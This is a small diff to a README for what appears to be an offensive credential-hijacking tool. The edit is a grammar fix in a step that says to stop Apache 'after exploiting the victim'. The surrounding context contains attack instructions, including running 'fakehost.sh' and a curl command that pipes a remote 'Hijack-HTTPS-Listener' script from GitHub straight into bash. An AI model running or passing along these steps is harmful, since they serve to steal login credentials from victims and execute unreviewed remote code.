@@ -57,7 +57,7 @@ bash fakehost.sh
      curl -s https://raw.githubusercontent.com/nu11secur1ty/SSTC-HTTPS-hijack-login-credentials/master/Attacker/Hijack-HTTPS-Listener/kazkuvgluvutu.sh | bash
 ```
 
-3. - After exploit the victim and then ***Stop Apache2***
+3. - After exploiting the victim you should***Stop Apache2***
 ```bash
 systemct stop apache2.service
 ```
